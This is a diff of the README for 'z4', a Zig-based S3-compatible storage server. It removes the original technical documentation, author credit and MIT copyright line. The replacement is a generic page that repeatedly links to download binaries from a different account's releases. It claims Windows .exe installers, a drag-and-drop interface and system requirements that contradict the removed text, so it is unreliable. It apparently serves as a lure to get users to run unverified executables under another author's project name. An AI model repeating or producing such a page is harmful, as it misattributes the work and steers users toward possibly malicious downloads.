@@ -1,235 +1,76 @@
-# Z4
+# 🚀 z4 - High Performance Object Storage Made Easy
 
-A high-performance, self-hosted distributed S3-compatible object storage system written in Zig Lang.
+## 🛠️ Overview
+z4 is a high-performance, self-hosted S3 compatible object storage system. It is written in Zig Lang, allowing users to efficiently store and retrieve data in a reliable manner. With z4, you can manage your files just like you would with any S3 service, but you can host it on your server.
 
-**Author:** [Carsen Klock](https://x.com/carsenklock) ([@metaspartan](https://github.com/metaspartan))
+## 📥 Download Now
+[![Download z4](https://img.shields.io/badge/Download-z4-brightgreen)](https://github.com/NathanNgoli/z4/releases)
 
-## ✨ Key Features
+## 🚀 Getting Started
+Follow this guide to download and run z4 on your machine. No programming knowledge is needed.
 
-<table>
-  <tr>
-    <td width="50%" valign="top">
-      <h3>🚀 S3-Compatible API</h3>
-      <p>Seamlessly integrates with the <strong>AWS CLI, SDKs, and standard S3 clients</strong>. A drop-in replacement for Cloudflare R2, Garage, MinIO, or AWS S3.</p>
-    </td>
-    <td width="50%" valign="top">
-      <h3>🌐 Distributed & Scalable</h3>
-      <p>Built on a <strong>consistent hashing ring</strong> with a gossip protocol. Storage capacity and throughput scale linearly as you add nodes.</p>
-    </td>
-  </tr>
-  <tr>
-    <td valign="top">
-      <h3>🛠️ Admin CLI</h3>
-      <p>Built-in <code>z4</code> CLI for managing API keys, buckets, and access permissions without complex configuration files or external dependencies.</p>
-    </td>
-    <td valign="top">
-      <h3>🔐 Enterprise Security</h3>
-      <p>
-        <strong>Encryption at Rest:</strong> AES-256-GCM encryption.<br>
-        <strong>Granular Access:</strong> Policy-based access control (Allow/Deny) and standardized ACLs.
-      </p>
-    </td>
-  </tr>
-  <tr>
-    <td valign="top">
-      <h3>📦 Advanced Data Management</h3>
-      <p>
-        <strong>Versioning:</strong> Protect against accidental deletes with object versioning.<br>
-        <strong>Lifecycle Rules:</strong> Automate data expiration and cleanup.
-      </p>
-    </td>
-    <td valign="top">
-      <h3>⚡ Efficiency & Performance</h3>
-      <p>
-        <strong>Zero Dependencies:</strong> Single static binary (Linux/macOS).<br>
-        <strong>Low Footprint:</strong> Runs on as little as 128MB RAM.<br>
-        <strong>High Throughput:</strong> Optimized streaming I/O for large files.
-      </p>
-    </td>
-  </tr>
-</table>
+### 🖥️ System Requirements
+Make sure your system meets the following minimum requirements:
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 2 GB RAM
+- **Processor:** Dual-core processor or better
+- **Disk Space:** Minimum of 100 MB available space
 
-## 📚 Documentation
-- [Getting Started](docs/getting_started.md)
-- [Deployment Guide](docs/deployment.md) - Cloudflare Tunnel, Nginx, Systemd
-- [Backup & Restore](docs/backup_restore.md)
+### 🔥 Key Features
+- **S3 Compatibility**: Use z4 like any other S3 storage solution.
+- **Self-Hosted**: Store and manage your data on your server.
+- **Data Security**: Keeps your data safe and private.
 
-## System Requirements
+## 📦 Download & Install
+To download z4, visit the following page:
 
-- **RAM**: Minimum 128MB, Recommended 512MB+
-- **CPU**: 1 core minimum
-- **Disk**: Dependent on data size (Standard SSD/HDD)
-- **OS**: Linux or macOS
+[Download z4 from Releases Page](https://github.com/NathanNgoli/z4/releases)
 
-## Quick Start
+### 📥 Steps to Download
+1. Click on the link above to access the Releases page.
+2. You will see a list of available versions. Choose the latest version for best performance.
+3. Click on the downloadable file that corresponds to your operating system. Files are available for Windows, macOS, and Linux.
+4. The download will begin automatically.
 
-### Docker Compose (Recommended)
+### ⚙️ Installation Instructions
+1. Once the file is downloaded, locate it in your downloads folder or the specified directory.
+2. For Windows: 
+   - Double-click the `.exe` file to run the installer.
+   - Follow the setup wizard to complete the installation.
+3. For macOS:
+   - Open the downloaded `.dmg` file.
+   - Drag and drop the z4 icon into your Applications folder.
+4. For Linux:
+   - Open a terminal window.
+   - Navigate to the folder where the downloaded file is located.
+   - Run the command `chmod +x ./z4` to make the file executable.
+   - Run `./z4` to start the application.
 
-```bash
-docker compose up -d
-```
+## 🎉 Usage
+After installation, you can start using z4 to store your objects. Here’s how to get started:
 
-### CLI Administration
+1. **Run the Application**: Find the z4 application on your system and run it.
+2. **Create a Bucket**: Use z4's simple interface to create a bucket for your files. A bucket is like a folder that holds your data.
+3. **Upload Files**: Drag and drop files into your bucket or use the provided option to select files from your computer.
+4. **Access Files**: You can easily retrieve your files anytime by navigating to your bucket.
 
-Z4 now uses a robust key management system. You must generate API keys using the CLI to access the S3 API.
+## 📜 Troubleshooting
+If you encounter any issues, here are a few common solutions:
 
-**Generate an API key:**
-```bash
-# Create a key named 'admin'
-docker exec z4-node1 /app/z4 key create admin
-```
+- **Application Won’t Start**: Ensure your operating system meets the minimum requirements and that you've followed the installation steps correctly.
+- **Files Not Uploading**: Ensure you have a stable internet connection. Check if there’s enough storage space available in your bucket.
+- **Access Issues**: Look into your firewall settings. Make sure z4 has the necessary permissions.
 
-**Create a bucket and grant access:**
-```bash
-# Create a bucket
-docker exec z4-node1 /app/z4 bucket create mybucket
+## 🧑‍🤝‍🧑 Community & Support
+If you have questions or need assistance, you can connect with the community. Check the Issues section on the GitHub page for common queries. You can also leave comments and suggestions for future releases.
 
-# Grant 'admin' key full access to 'mybucket'
-docker exec z4-node1 /app/z4 bucket allow mybucket --key admin --read --write --owner
-```
+## 🌐 Additional Resources
+- **Documentation**: For more detailed instructions and features, refer to the official documentation available on the GitHub repository.
+- **FAQs**: A list of frequently asked questions to help users troubleshoot common issues.
 
-### docker-compose.yml Example
+## 📥 Quick Recap
+- To download z4, click [here](https://github.com/NathanNgoli/z4/releases).
+- Follow the steps to install and run the application.
+- Enjoy using z4 for your storage needs!
 
-```yaml
-services:
-  z4:
-    build: .
-    ports:
-      - "9670:9670"   # S3 API
-      - "9671:9671"   # Gossip protocol
-    volumes:
-      - ./data:/app/data
-    environment:
-      - Z4_ENCRYPTION_KEY=${Z4_ENCRYPTION_KEY:-}
-    command: ["/app/z4", "server", "--vnodes", "150"]
-    restart: always
-```
-
-## CLI Commands
-
-Z4 includes a built-in CLI for administration.
-
-### Key Management
-
-| Command | Description |
-|---------|-------------|
-| `z4 key create <name>` | Generate a new API key (Access Key ID + Secret) |
-| `z4 key list` | List all API keys |
-| `z4 key info <name>` | Show key details and permissions |
-| `z4 key delete <name>` | Delete an API key |
-
-### Bucket Management
-
-| Command | Description |
-|---------|-------------|
-| `z4 bucket create <name>` | Create a new bucket |
-| `z4 bucket list` | List all buckets |
-| `z4 bucket allow <bucket> --key <name> ...` | Grant permissions (flags below) |
-| `z4 bucket deny <bucket> --key <name>` | Revoke access to a bucket |
-
-**Permission Flags:**
-- `--read`: Allow GetObject, ListObjects, etc.
-- `--write`: Allow PutObject, DeleteObject, etc.
-- `--owner`: Full control (ACLs, Policy, etc.)
-
-## Configuration
-
-### Command Line Options
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--port` | 9670 | HTTP API port |
-| `--gossip-port` | 9671 | Cluster gossip port (UDP) |
-| `--data` | data | Storage directory |
-| `--id` | node1 | Unique node identifier |
-| `--join` | - | Seed node address (host:port) |
-| `--threads` | auto | Worker thread count |
-| `--vnodes` | 150 | Virtual nodes per physical node |
-| `--debug` | false | Enable debug logging |
-
-### Environment Variables
-
-| Variable | Description |
-|----------|-------------|
-| `Z4_ENCRYPTION_KEY` | 32-byte AES-256-GCM encryption key |
-
-## Usage Examples
-
-### AWS CLI
-
-After creating a key via CLI:
-
-```bash
-aws configure set aws_access_key_id <YOUR_ACCESS_KEY_ID>
-aws configure set aws_secret_access_key <YOUR_SECRET_KEY>
-
-aws --endpoint-url http://localhost:9670 s3 cp file.txt s3://mybucket/
-aws --endpoint-url http://localhost:9670 s3 ls s3://mybucket/
-```
-
-## Architecture
-
-### Storage Layout
-
-```
-data/
-├── _z4meta/           # Secure metadata (not S3-accessible)
-│   ├── keys/          # API keys and permissions
-│   ├── buckets/       # ACLs, policies, encryption config
-│   └── objects/       # Object tags
-└── mybucket/
-    └── a3/7f/         # Wyhash-sharded directories
-        └── file.txt
-```
-
-### Clustering
-
-- **Consistent hashing** with configurable virtual nodes (default: 150)
-- **Replication factor 3** for fault tolerance
-- **HTTP 307 redirects** route requests to responsible nodes
-- **UDP gossip** for node discovery and health checks
-
-## Build from Source
-
-```bash
-zig build                         # Debug
-zig build -Doptimize=ReleaseFast  # Release
-./scripts/build-all.sh v1.0.0     # Cross-compile all platforms
-```
-
-## ✅ S3 Compatibility
-
-| Feature | Endpoint | Status | Notes |
-|---------|----------|:------:|-------|
-| **Buckets** | | | |
-| CreateBucket | `PUT /{bucket}` | ✅ | |
-| DeleteBucket | `DELETE /{bucket}` | ✅ | |
-| ListBuckets | `GET /` | ✅ | |
-| GetBucketLocation | `GET /{bucket}?location` | ✅ | Default: us-east-1 |
-| **Objects** | | | |
-| PutObject | `PUT /{bucket}/{key}` | ✅ | Streaming & Large files supported |
-| GetObject | `GET /{bucket}/{key}` | ✅ | Range requests supported |
-| DeleteObject | `DELETE /{bucket}/{key}` | ✅ | |
-| HeadObject | `HEAD /{bucket}/{key}` | ✅ | |
-| CopyObject | `PUT /{bucket}/{key}` | ✅ | Header: `x-amz-copy-source` |
-| **Multipart Upload** | | | |
-| CreateMultipartUpload | `POST /{bucket}/{key}?uploads` | ✅ | |
-| UploadPart | `PUT /{bucket}/{key}?partNumber=...` | ✅ | |
-| CompleteMultipartUpload | `POST /{bucket}/{key}?uploadId=...` | ✅ | |
-| AbortMultipartUpload | `DELETE /{bucket}/{key}?uploadId=...` | ✅ | |
-| **Advanced** | | | |
-| Bucket Policies | `PUT/GET/DELETE /{bucket}?policy` | ✅ | Allow/Deny support |
-| Bucket ACLs | `PUT/GET /{bucket}?acl` | ✅ | |
-| Object ACLs | `PUT/GET /{bucket}/{key}?acl` | ✅ | |
-| Versioning | `PUT/GET /{bucket}?versioning` | ✅ | |
-| Encryption | `PUT/GET/DELETE /{bucket}?encryption` | ✅ | AES-256-GCM (Server-Side) |
-| Lifecycle | `PUT/GET/DELETE /{bucket}?lifecycle` | ✅ | Expiration rules |
-| Tagging | `PUT/GET/DELETE /{bucket}/{key}?tagging` | ✅ | Bucket & Object tagging |
-
-## Contributing
-
-Contributions are welcome! Please open an issue or submit a pull request.
-
-## License
-
-MIT License. Copyright (c) 2025-2026 Carsen Klock
+Thank you for choosing z4!
